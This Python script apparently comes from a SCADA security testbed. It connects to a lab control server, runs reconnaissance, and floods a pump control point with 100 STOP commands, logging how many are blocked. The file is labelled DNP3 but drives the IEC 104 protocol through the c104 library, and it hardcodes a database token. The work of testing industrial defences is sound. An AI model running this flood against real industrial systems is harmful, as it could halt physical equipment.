#!/usr/bin/env python3
"""
DNP3 Attacker - Secure Phase Testing
Tracks blocked connections and reports security metrics
"""

import os
import socket
import time
import c104
from influxdb_client import InfluxDBClient, Point
from influxdb_client.client.write_api import SYNCHRONOUS

TARGET_HOST = os.environ.get("TARGET_HOST", "dnp3-server")
INFLUX_URL = os.environ.get("INFLUXDB_URL", "http://influxdb:8086")
INFLUX_TOKEN = "scada-token-123"
INFLUX_ORG = "scada-lab"
INFLUX_BUCKET = "scada-metrics"

_influx = InfluxDBClient(url=INFLUX_URL, token=INFLUX_TOKEN, org=INFLUX_ORG)
_write_api = _influx.write_api(write_options=SYNCHRONOUS)

stats = {
    "total_attempts": 0,
    "successful": 0,
    "blocked": 0,
    "connection_failures": 0,
    "recon_success": 0,
    "recon_blocked": 0,
    "write_success": 0,
    "write_blocked": 0,
}


def push_metric(action, field_name, value):
    try:
        point = (
            Point("dnp3")
            .tag("container", "dnp3-attacker")
            .tag("action", action)
            .tag("phase", "secure")
            .field(field_name, float(value))
        )
        _write_api.write(bucket=INFLUX_BUCKET, record=point)
    except Exception as e:
        print(f"InfluxDB write error: {e}")


def push_stats():
    """Push aggregated attack statistics"""
    try:
        block_rate = 0
        if stats["total_attempts"] > 0:
            block_rate = (stats["blocked"] / stats["total_attempts"]) * 100
        
        point = (
            Point("attack_stats")
            .tag("container", "dnp3-attacker")
            .tag("protocol", "dnp3")
            .tag("phase", "secure")
            .field("total_attempts", stats["total_attempts"])
            .field("successful", stats["successful"])
            .field("blocked", stats["blocked"])
            .field("block_rate", block_rate)
            .field("connection_failures", stats["connection_failures"])
            .field("recon_success", stats["recon_success"])
            .field("recon_blocked", stats["recon_blocked"])
            .field("write_success", stats["write_success"])
            .field("write_blocked", stats["write_blocked"])
        )
        _write_api.write(bucket=INFLUX_BUCKET, record=point)
        print(f"[STATS] Attempts: {stats['total_attempts']}, Blocked: {stats['blocked']}, Rate: {block_rate:.1f}%")
    except Exception as e:
        print(f"Stats push error: {e}")


def run_dnp3_attacker():
    print("=" * 60)
    print("  DNP3 ATTACKER - SECURE PHASE TESTING")
    print("=" * 60)
    
    while True:
        print("\n--- BẮT ĐẦU CHIẾN DỊCH TẤN CÔNG (SECURE MODE) ---")
        
        try:
            print(f"[TARGET] {TARGET_HOST}:20000")
            ip = socket.gethostbyname(TARGET_HOST)
            client = c104.Client()
            connection = client.add_connection(ip=ip, port=20000, init=c104.Init.ALL)
            station = connection.add_station(common_address=1)

            station.add_point(io_address=10, type=c104.Type.M_SP_NA_1)
            station.add_point(io_address=20, type=c104.Type.M_ME_NC_1)
            station.add_point(io_address=30, type=c104.Type.M_ME_NC_1)
            pump_cmd = station.add_point(io_address=100, type=c104.Type.C_SC_NA_1)

            client.start()

            retries = 0
            while connection.state != c104.ConnectionState.OPEN:
                print(f"[WAIT] Đang chờ DNP3 server tại {connection.ip}:{connection.port} ...")
                time.sleep(3)
                retries += 1
                if retries > 10:
                    stats["connection_failures"] += 1
                    stats["blocked"] += 1
                    stats["total_attempts"] += 1
                    print("[BLOCKED] Kết nối bị chặn hoặc timeout!")
                    push_metric("blocked", "blocked", 1)
                    push_stats()
                    break

            if connection.state != c104.ConnectionState.OPEN:
                push_secure_stats()
                client.stop()
                time.sleep(30)
                continue

            print(f"[OK] Kết nối thành công đến DNP3 Server!")

            # Phase 1: Reconnaissance
            print("\n[PHASE 1] Quét: gửi integrity poll...")
            stats["total_attempts"] += 1
            
            try:
                start_time = time.time()
                gi_ok = connection.interrogation(
                    common_address=1,
                    cause=c104.Cot.ACTIVATION,
                    qualifier=c104.Qoi.STATION,
                )
                latency = (time.time() - start_time) * 1000
                
                if gi_ok:
                    stats["recon_success"] += 1
                    stats["successful"] += 1
                    print(f"[OK] Quét integrity poll thành công trong {latency:.2f}ms")
                    push_metric("attack_recon", "gi_ok", 1)
                    push_metric("attack_recon", "latency", latency)
                else:
                    stats["recon_blocked"] += 1
                    stats["blocked"] += 1
                    print(f"[BLOCKED] Quét integrity poll bị chặn!")
                    push_metric("recon_blocked", "blocked", 1)
            except Exception as e:
                stats["recon_blocked"] += 1
                stats["blocked"] += 1
                print(f"[BLOCKED] Recon exception: {e}")
                push_metric("recon_blocked", "blocked", 1)
                gi_ok = False

            time.sleep(2)

            # Phase 2: DoS Attack
            if gi_ok:
                print("\n[PHASE 2] Tấn công DoS: Gửi lệnh STOP bơm x 100 lần...")
                success_count = 0
                blocked_count = 0

                for i in range(100):
                    stats["total_attempts"] += 1
                    try:
                        start_time = time.time()
                        pump_cmd.value = False
                        ok = pump_cmd.transmit(cause=c104.Cot.ACTIVATION)
                        latency = (time.time() - start_time) * 1000

                        if ok:
                            success_count += 1
                            stats["write_success"] += 1
                            stats["successful"] += 1
                            push_metric("write", "latency", latency)
                            push_metric("write", "stop_cmd_value", 0)
                        else:
                            blocked_count += 1
                            stats["write_blocked"] += 1
                            stats["blocked"] += 1
                            push_metric("write_blocked", "blocked", 1)

                        time.sleep(0.05)
                    except Exception as e:
                        blocked_count += 1
                        stats["write_blocked"] += 1
                        stats["blocked"] += 1
                        push_metric("write_blocked", "blocked", 1)

                print(f"[RESULT] Gửi thành công: {success_count}/100, Bị chặn: {blocked_count}/100")
            else:
                print("[SKIP] Bỏ qua Phase 2 do quét thất bại.")

            push_stats()
            client.stop()

        except socket.gaierror:
            stats["connection_failures"] += 1
            stats["blocked"] += 1
            stats["total_attempts"] += 1
            print("[BLOCKED] DNS resolution failed - Server unreachable!")
            push_metric("blocked", "blocked", 1)

        except Exception as e:
            stats["connection_failures"] += 1
            stats["blocked"] += 1
            stats["total_attempts"] += 1
            print(f"[ERROR] {e}")
            push_metric("error", "blocked", 1)

        push_secure_stats()
        print("\n--- KẾT THÚC ĐỢT TẤN CÔNG. CHỜ 30 GIÂY ---")
        time.sleep(30)


def push_secure_stats():
    try:
        point = (
            Point("secure_attack")
            .tag("container", "dnp3-attacker")
            .tag("protocol", "dnp3")
            .field("total_attempts", stats["total_attempts"])
            .field("successful", stats["successful"])
            .field("blocked", stats["blocked"])
            .field("connection_failures", stats["connection_failures"])
        )
        _write_api.write(bucket=INFLUX_BUCKET, record=point)
    except Exception as e:
        print(f"secure_attack push error: {e}")


if __name__ == "__main__":
    run_dnp3_attacker()
